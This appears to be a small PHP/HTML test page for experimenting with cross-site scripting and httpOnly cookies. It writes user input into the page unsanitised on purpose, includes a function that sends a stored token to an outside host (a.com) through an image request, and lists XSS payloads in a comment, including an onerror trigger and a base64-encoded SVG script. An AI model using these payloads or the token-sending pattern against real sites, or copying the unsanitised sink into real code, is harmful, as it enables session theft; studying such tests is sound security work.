<?php 
   header("Set-Cookie: token=thisishttponlytoken; httpOnly");
?>

<!DOCTYPE html>
<html>
<head>
	<title>XSS test</title>
</head>
<body>

	this is a test page with http only, I am writting  

	<div id="rs"></div>

	<form>
		<input type="" name="" id="input" oninput="handleInputChange(this)" />
	</form>


	<script type="text/javascript">
		localStorage.setItem("token","thisistoken");


		function handleInputChange(target){
			document.getElementById("rs").outerHTML = '<div id="rs">'+target.value+'</div>';
		}

		function sendToken(){
			console.log(document.cookie);
			var img=new Image();
			img.src='http://a.com?token='+ localStorage.getItem("token");
			

			// img.onerror=function(){
			//  alert('error');
			// }
			
			// img.onload=function(){
			//  alert('success');
			// }
			
		}
	</script>


<!-- 
		XSS payload for chrome:
		
		<img/src=x onerror=sendToken()>

		<iframe src="data:text/html,<script>alert(1)</script>"></iframe>

		<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" allowscriptaccess="always"></embed> 


 -->
</body>
</html>